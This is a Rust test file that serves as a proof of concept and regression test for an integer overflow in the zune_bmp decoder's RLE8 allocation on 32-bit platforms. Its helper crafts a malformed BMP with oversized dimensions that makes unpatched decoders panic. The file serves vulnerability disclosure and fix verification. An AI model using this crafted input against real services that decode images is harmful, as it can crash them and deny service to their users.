//! Proof of concept for RLE allocation overflow vulnerability
//!
//! This test demonstrates that the RLE allocation at decoder.rs uses
//! unchecked multiplication which can overflow on 32-bit platforms.

use zune_bmp::BmpDecoder;
use zune_core::bytestream::ZCursor;

/// Craft a BMP with RLE8 compression at specified dimensions
fn craft_rle8_bmp(width: u32, height: u32) -> Vec<u8> {
    let mut data = Vec::new();

    // === BMP File Header (14 bytes) ===
    data.extend_from_slice(b"BM");
    data.extend_from_slice(&0u32.to_le_bytes());
    data.extend_from_slice(&0u32.to_le_bytes());
    let pixel_offset: u32 = 14 + 40 + (256 * 4);
    data.extend_from_slice(&pixel_offset.to_le_bytes());

    // === BITMAPINFOHEADER (40 bytes) ===
    data.extend_from_slice(&40u32.to_le_bytes());
    data.extend_from_slice(&width.to_le_bytes());
    data.extend_from_slice(&height.to_le_bytes());
    data.extend_from_slice(&1u16.to_le_bytes());
    data.extend_from_slice(&8u16.to_le_bytes());      // 8bpp
    data.extend_from_slice(&1u32.to_le_bytes());      // RLE8
    data.extend_from_slice(&0u32.to_le_bytes());
    data.extend_from_slice(&2835u32.to_le_bytes());
    data.extend_from_slice(&2835u32.to_le_bytes());
    data.extend_from_slice(&256u32.to_le_bytes());
    data.extend_from_slice(&0u32.to_le_bytes());

    // === Color Palette (256 * 4 bytes) ===
    for i in 0u8..=255 {
        data.extend_from_slice(&[i, i, i, 0]);
    }

    // === RLE8 Data - end of bitmap ===
    data.extend_from_slice(&[0x00, 0x01]);

    let file_size = data.len() as u32;
    data[2..6].copy_from_slice(&file_size.to_le_bytes());

    data
}

/// Test that proves 32-bit overflow in the multiplication
/// On 32-bit: 16384 * 16384 * 32 = 8,589,934,592 > u32::MAX
#[test]
fn test_32bit_overflow_occurs() {
    let width: u32 = 16384;
    let height: u32 = 16384;
    let depth: u32 = 32;

    // This multiplication overflows on 32-bit
    let result = (width as u32)
        .checked_mul(height)
        .and_then(|v| v.checked_mul(depth));

    assert!(result.is_none(), "32-bit overflow should occur");
}

/// This test will PANIC on 32-bit platforms due to the overflow bug
/// After the fix, it should return Err instead of panicking
#[test]
fn test_rle_large_dimensions() {
    // 16384x16384 is within default limits but causes overflow on 32-bit
    let bmp = craft_rle8_bmp(16384, 16384);

    let cursor = ZCursor::new(&bmp);
    let mut decoder = BmpDecoder::new(cursor);

    // On 64-bit: may succeed or OOM
    // On 32-bit WITHOUT fix: PANICS due to overflow
    // On 32-bit WITH fix: returns Err(OverFlowOccurred)
    let result = decoder.decode();

    // We just want it to not panic - error is fine
    println!("Result: {:?}", result.is_ok());
}
